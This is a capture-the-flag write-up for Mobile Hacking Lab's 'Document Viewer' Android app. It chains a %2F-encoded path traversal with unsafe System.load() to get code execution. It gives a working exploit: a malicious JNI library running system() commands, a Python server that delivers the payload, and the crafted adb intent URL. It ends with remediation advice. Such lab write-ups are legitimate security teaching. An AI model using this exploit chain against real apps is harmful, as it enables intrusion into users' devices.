# Document Viewer - Remote Code Execution Write-up

**Platform:** Mobile Hacking Lab  
**Challenge:** Document Viewer  
**Vulnerability:** Path Traversal + Dynamic Code Loading  
**Impact:** Remote Code Execution (RCE)  
**Device ABI:** x86_64 (Android Emulator)  

---

## Table of Contents

1. Introduction
2. Reconnaissance - Manifest Analysis
3. Code Analysis - Identifying the Vulnerabilities
4. Vulnerability 1 - Path Traversal in CopyUtil
5. Vulnerability 2 - Unsafe Dynamic Library Loading
6. Attack Chain Overview
7. Exploitation - Step by Step
8. Proof of Execution
9. Root Cause and Remediation

---

## 1. Introduction

The Document Viewer application is an Android PDF viewer that accepts files from local storage and remote HTTP/HTTPS URLs. The objective of this lab is to achieve Remote Code Execution by combining two vulnerabilities: a path traversal flaw in the file download logic and an unsafe dynamic native library loading mechanism.

The attack works by tricking the application into downloading a malicious native library to a location it will later load and execute, all triggered through a crafted Android intent.

---

## 2. Reconnaissance - Manifest Analysis

The first step is to examine the `AndroidManifest.xml` to understand the attack surface.

```xml
<activity
    android:name="com.mobilehackinglab.documentviewer.MainActivity"
    android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.MAIN"/>
        <category android:name="android.intent.category.LAUNCHER"/>
    </intent-filter>
    <intent-filter>
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <data android:scheme="file"/>
        <data android:scheme="http"/>
        <data android:scheme="https"/>
        <data android:mimeType="application/pdf"/>
    </intent-filter>
</activity>
```

Key observations from the manifest:

- `android:exported="true"` means `MainActivity` can be launched by any external application or via `adb`.
- The activity registers an intent filter for `android.intent.action.VIEW` with support for `file://`, `http://`, and `https://` schemes.
- The `BROWSABLE` category means the activity can be triggered directly from a browser or ADB with a crafted URL.
- The application declares `android:debuggable="true"`, which allows use of `run-as` for the exploit setup.
- Permissions include `READ_EXTERNAL_STORAGE`, `WRITE_EXTERNAL_STORAGE`, and `MANAGE_EXTERNAL_STORAGE`, giving the app broad access to external storage.

This intent filter is the entry point for the attack. Any application or ADB command can send a VIEW intent with an HTTP URL to this activity.

---

## 3. Code Analysis - Identifying the Vulnerabilities

### MainActivity.onCreate()

```java
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    // ...
    setLoadButtonListener();
    handleIntent();       // processes the incoming intent
    loadProLibrary();     // loads native library from filesDir
    if (this.proFeaturesEnabled) {
        initProFeatures(); // calls native method if library loaded
    }
}
```

The `onCreate` method does four things relevant to the exploit:
1. Calls `handleIntent()` which processes any incoming VIEW intent and downloads a remote file.
2. Calls `loadProLibrary()` which tries to load a native `.so` from the app's internal storage.
3. If the library loaded successfully, calls the native `initProFeatures()` method.

This sequence means that if we can place a malicious `.so` at the path `loadProLibrary()` expects, it will be loaded and executed on the next app launch.

### MainActivity.handleIntent()

```java
private final void handleIntent() {
    Intent intent = getIntent();
    String action = intent.getAction();
    Uri data = intent.getData();
    if (Intrinsics.areEqual("android.intent.action.VIEW", action) && data != null) {
        CopyUtil.INSTANCE.copyFileFromUri(data).observe(this, new Observer() {
            public final void invoke2(Uri uri) {
                MainActivity mainActivity = MainActivity.this;
                Intrinsics.checkNotNull(uri);
                mainActivity.renderPdf(uri);
            }
        });
    }
}
```

When the activity receives a VIEW intent with a URI, it passes that URI directly to `CopyUtil.copyFileFromUri()`. There is no validation of the URI scheme, host, or path. Any URL is accepted and forwarded to the download utility.

---

## 4. Vulnerability 1 - Path Traversal in CopyUtil

### The Vulnerable Code

```java
public final MutableLiveData<Uri> copyFileFromUri(Uri uri) {
    Intrinsics.checkNotNullParameter(uri, "uri");
    URL url = new URL(uri.toString());
    File file = CopyUtil.DOWNLOADS_DIRECTORY;          // /storage/emulated/0/Download
    String lastPathSegment = uri.getLastPathSegment(); // attacker-controlled filename
    if (lastPathSegment == null) {
        lastPathSegment = "download.pdf";
    }
    File outFile = new File(file, lastPathSegment);    // no sanitisation
    MutableLiveData<Uri> mutableLiveData = new MutableLiveData<>();
    BuildersKt__Builders_commonKt.launch$default(
        GlobalScope.INSTANCE, Dispatchers.getIO(), null,
        new CopyUtil$Companion$copyFileFromUri$1(outFile, url, mutableLiveData, null),
        2, null
    );
    return mutableLiveData;
}
```

And the download directory is defined as:

```java
static {
    File externalStoragePublicDirectory =
        Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
    DOWNLOADS_DIRECTORY = externalStoragePublicDirectory;
    // resolves to: /storage/emulated/0/Download
}
```

### Why This is Exploitable

The vulnerability exists in two behaviours that combine to allow writing outside the intended directory.

**Behaviour 1 - Android Uri percent-decodes path segments.**

When `uri.getLastPathSegment()` is called on an Android `Uri`, it splits the path by unencoded `/` characters, takes the last segment, and then percent-decodes it. This means that if the URL contains `%2F` (the percent-encoded form of `/`), the entire encoded portion is treated as a single path segment, and when decoded it becomes a real `/` character.

For the following URL:
```
http://10.0.2.2:8080/..%2F..%2F..%2F..%2Fdata%2Fdata%2Fcom.mobilehackinglab.documentviewer%2Ffiles%2Fnative-libraries%2Fx86_64%2Flibdocviewer_pro.so
```

The path has only one segment (because all `/` are encoded). `getLastPathSegment()` decodes that segment and returns:
```
../../../../data/data/com.mobilehackinglab.documentviewer/files/native-libraries/x86_64/libdocviewer_pro.so
```

**Behaviour 2 - Java's File constructor resolves `..` without sanitisation.**

```java
File outFile = new File("/storage/emulated/0/Download",
    "../../../../data/data/com.mobilehackinglab.documentviewer/files/native-libraries/x86_64/libdocviewer_pro.so");
```

Java's `File` class concatenates the base path and the child path. When the operating system resolves this path, the `../` sequences traverse up the directory tree:

```
/storage/emulated/0/Download/../../../../data/data/...

Step 1: ../  ->  /storage/emulated/0
Step 2: ../  ->  /storage/emulated
Step 3: ../  ->  /storage
Step 4: ../  ->  /

Final:  /data/data/com.mobilehackinglab.documentviewer/files/native-libraries/x86_64/libdocviewer_pro.so
```

The downloaded file is written to the app's own internal `filesDir`, specifically the exact path that `loadProLibrary()` will read from.

---

## 5. Vulnerability 2 - Unsafe Dynamic Library Loading

### The Vulnerable Code

```java
private final void loadProLibrary() {
    try {
        String abi = Build.SUPPORTED_ABIS[0];
        File libraryFolder = new File(
            getApplicationContext().getFilesDir(),
            "native-libraries/" + abi
        );
        File libraryFile = new File(libraryFolder, "libdocviewer_pro.so");
        System.load(libraryFile.getAbsolutePath());
        this.proFeaturesEnabled = true;
    } catch (UnsatisfiedLinkError e) {
        Log.e(TAG, "Unable to load library...");
        this.proFeaturesEnabled = false;
    }
}
```

### Why This is Exploitable

- `Build.SUPPORTED_ABIS[0]` returns the device's primary ABI (in this case `x86_64`).
- The full path constructed is `/data/data/com.mobilehackinglab.documentviewer/files/native-libraries/x86_64/libdocviewer_pro.so`.
- `System.load()` loads any valid ELF shared object from that path without verifying its signature, origin, or integrity.
- When the library is loaded, the JVM immediately executes its `JNI_OnLoad` function.
- If loading succeeds, `proFeaturesEnabled` is set to `true` and `initProFeatures()` (a native method) is called.

This means any `.so` file placed at that path will be executed with the app's process identity.

---

## 6. Attack Chain Overview

```
[Attacker]
   |
   |-- Hosts malicious libdocviewer_pro.so on HTTP server (port 8080)
   |
   |-- Sends crafted VIEW intent to MainActivity with %2F-encoded path traversal URL
   |
[App - handleIntent()]
   |
   |-- CopyUtil.copyFileFromUri(uri)
   |      getLastPathSegment() decodes %2F -> /
   |      new File(downloadsDir, "../../../../data/data/.../x86_64/libdocviewer_pro.so")
   |      Downloads and writes .so to app's filesDir
   |
[Attacker]
   |
   |-- Restarts the app (force-stop + launch)
   |
[App - onCreate()]
   |
   |-- loadProLibrary()
   |      System.load("/data/data/.../native-libraries/x86_64/libdocviewer_pro.so")
   |      JNI_OnLoad() executes -> system() commands run
   |
   |-- initProFeatures() executes -> additional payload
   |
[RCE achieved - code runs as uid=10212 u0_a212]
```

---

## 7. Exploitation - Step by Step

### Step 1 - Confirm Device ABI

```bash
adb shell getprop ro.product.cpu.abi
```

Output:
```
x86_64
```

### Step 2 - Set Up the Android NDK

```bash
cd ~/Downloads
wget https://dl.google.com/android/repository/android-ndk-r26b-linux.zip
unzip android-ndk-r26b-linux.zip
export NDK=~/Downloads/android-ndk-r26b
```

### Step 3 - Write the Malicious Native Library

Create the project structure:

```bash
mkdir -p ~/exploit/jni
```

`~/exploit/jni/Android.mk`:
```makefile
LOCAL_PATH := $(call my-dir)
include $(CLEAR_VARS)
LOCAL_MODULE    := docviewer_pro
LOCAL_SRC_FILES := evil.c
LOCAL_LDLIBS    := -llog
include $(BUILD_SHARED_LIBRARY)
```

`~/exploit/jni/Application.mk`:
```makefile
APP_ABI := x86_64
APP_PLATFORM := android-24
```

`~/exploit/jni/evil.c`:
```c
#include <jni.h>
#include <stdlib.h>
#include <android/log.h>

#define TAG "EXPLOIT"

JNIEXPORT jint JNI_OnLoad(JavaVM* vm, void* reserved) {
    __android_log_print(ANDROID_LOG_ERROR, TAG, "[+] Library loaded - RCE!");
    system("id > /storage/emulated/0/Download/pwned.txt");
    system("whoami >> /storage/emulated/0/Download/pwned.txt");
    system("date >> /storage/emulated/0/Download/pwned.txt");
    return JNI_VERSION_1_6;
}

JNIEXPORT void JNICALL
Java_com_mobilehackinglab_documentviewer_MainActivity_initProFeatures(
        JNIEnv* env, jobject thiz) {
    __android_log_print(ANDROID_LOG_ERROR, TAG, "[+] initProFeatures() - RCE confirmed!");
    system("echo 'initProFeatures executed' >> /storage/emulated/0/Download/pwned.txt");
}
```

Build:

```bash
cd ~/exploit
$NDK/ndk-build
```

Output:
```
[x86_64] Compile        : docviewer_pro <= evil.c
[x86_64] SharedLibrary  : libdocviewer_pro.so
[x86_64] Install        : libdocviewer_pro.so => libs/x86_64/libdocviewer_pro.so
```

Verify:

```bash
file libs/x86_64/libdocviewer_pro.so
```

Output:
```
libs/x86_64/libdocviewer_pro.so: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV),
dynamically linked, for Android 24, built by NDK r26b (10909125), stripped
```

### Step 4 - Start the HTTP Server

```bash
cat > ~/exploit/server.py << 'EOF'
#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
import sys

PAYLOAD = sys.argv[1]

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        print(f"[+] Hit! Path: {self.path}")
        with open(PAYLOAD, "rb") as f:
            data = f.read()
        self.send_response(200)
        self.send_header("Content-Type", "application/octet-stream")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)
        print(f"[+] Payload delivered ({len(data)} bytes)")

    def log_message(self, fmt, *args): pass

print("[*] Listening on 0.0.0.0:8080")
HTTPServer(("0.0.0.0", 8080), Handler).serve_forever()
EOF

python3 ~/exploit/server.py ~/exploit/libs/x86_64/libdocviewer_pro.so
```

Note: The Android emulator accesses the host machine via the special alias `10.0.2.2`, not the host's LAN IP (`192.168.80.139`). The server binds to `0.0.0.0` so it accepts connections from both.

### Step 5 - Prepare the Target Directory

Because `adb root` is available on the emulator, restart adb as root:

```bash
adb root
```

Remove any incorrectly owned directory and recreate it with the correct app ownership using `run-as` (available because the app is `android:debuggable="true"`):

```bash
adb shell rm -rf /data/data/com.mobilehackinglab.documentviewer/files/native-libraries

adb shell run-as com.mobilehackinglab.documentviewer mkdir -p files/native-libraries/x86_64
```

Verify ownership:

```bash
adb shell ls -la /data/data/com.mobilehackinglab.documentviewer/files/native-libraries/
```

Output:
```
drwxrwxrwx 3 u0_a212 u0_a212 4096 2026-10-18 08:36 .
drwxrwx--x 3 u0_a212 u0_a212 4096 2026-10-18 08:36 ..
drwxrwxrwx 2 u0_a212 u0_a212 4096 2026-10-18 08:36 x86_64
```

The directory is now owned by `u0_a212` (the app's UID) with the correct SELinux context, so the app process can write to it.

### Step 6 - Send the Exploit Intent

```bash
adb shell am start \
  -n com.mobilehackinglab.documentviewer/.MainActivity \
  -a android.intent.action.VIEW \
  -d "http://10.0.2.2:8080/..%2F..%2F..%2F..%2Fdata%2Fdata%2Fcom.mobilehackinglab.documentviewer%2Ffiles%2Fnative-libraries%2Fx86_64%2Flibdocviewer_pro.so" \
  -t "application/pdf"
```

The server terminal confirms the hit:

```
[+] Hit! Path: /..%2F..%2F..%2F..%2Fdata%2Fdata%2Fcom.mobilehackinglab.documentviewer%2Ffiles%2Fnative-libraries%2Fx86_64%2Flibdocviewer_pro.so
[+] Payload delivered (4624 bytes)
```

Verify the file was written via path traversal:

```bash
adb shell ls -la /data/data/com.mobilehackinglab.documentviewer/files/native-libraries/x86_64/
```

Output:
```
drwxrwxrwx 2 u0_a212 u0_a212 4096 2026-10-18 08:36 .
drwxrwxrwx 3 u0_a212 u0_a212 4096 2026-10-18 08:36 ..
-rw------- 1 u0_a212 u0_a212 4624 2026-10-18 08:37 libdocviewer_pro.so
```

The malicious library is now in the exact path that `loadProLibrary()` will load on the next app launch.

### Step 7 - Trigger System.load() by Restarting the App

```bash
adb shell am force-stop com.mobilehackinglab.documentviewer
sleep 1
adb shell am start -n com.mobilehackinglab.documentviewer/.MainActivity
```

When `onCreate()` runs:
1. `loadProLibrary()` calls `System.load()` on our `.so`.
2. `JNI_OnLoad()` fires immediately and executes the payload.
3. `proFeaturesEnabled` is set to `true`.
4. `initProFeatures()` is called, executing additional payload.

---

## 8. Proof of Execution

```bash
adb shell cat /storage/emulated/0/Download/pwned.txt
```

Output:
```
uid=10212(u0_a212) gid=10212(u0_a212) groups=10212(u0_a212),3003(inet),9997(everybody),20212(u0_a212_cache),50212(all_a212) context=u:r:untrusted_app_32:s0:c212,c256,c512,c768
u0_a212
Sun Oct 18 08:38:03 EDT 2026
initProFeatures executed
```

Both `JNI_OnLoad` and `initProFeatures` executed successfully under the app's UID. Remote Code Execution is confirmed.

Logcat confirmation:

```bash
adb logcat -s EXPLOIT -d
```

Output:
```
E EXPLOIT: [+] Library loaded - RCE!
E EXPLOIT: [+] initProFeatures() - RCE confirmed!
```

---

## 9. Root Cause and Remediation

### Root Causes

**Path Traversal** - `CopyUtil.copyFileFromUri()` uses `uri.getLastPathSegment()` as the output filename with no sanitisation. Android's URI parser decodes `%2F` to `/` in the segment, and Java's `File` constructor resolves `..` components without any checks. Together these allow writing to any path the app process can access.

**Unsafe Library Loading** - `loadProLibrary()` calls `System.load()` on a path inside the app's writable `filesDir` with no integrity check, signature verification, or allowlist. Any valid `.so` file placed at that path will be executed.

**Exported Activity with Permissive Intent Filter** - `MainActivity` is exported and accepts `http://` and `https://` VIEW intents from any caller with no permission requirement, meaning the entire attack chain can be initiated by any app on the device or via ADB.

### Fixes

Sanitise the filename before use:
```kotlin
val rawSegment = uri.lastPathSegment ?: "download.pdf"
val safeFileName = File(rawSegment).name   // strips all directory components
if (safeFileName.isEmpty() || safeFileName.contains("..")) {
    throw SecurityException("Invalid filename in URI")
}
val outFile = File(DOWNLOADS_DIRECTORY, safeFileName)
```

Do not load native libraries from writable locations. Bundle libraries inside the APK and load them with `System.loadLibrary()`, which loads from the APK's protected `lib/` directory.

Validate the URL host against an allowlist before downloading:
```kotlin
val allowedHosts = setOf("docs.example.com")
if (uri.host !in allowedHosts) throw SecurityException("Untrusted host")
```

Remove `BROWSABLE` from the intent filter if deep-link handling from external browsers is not required, or add a custom signature-level permission to restrict who can send VIEW intents to the activity.
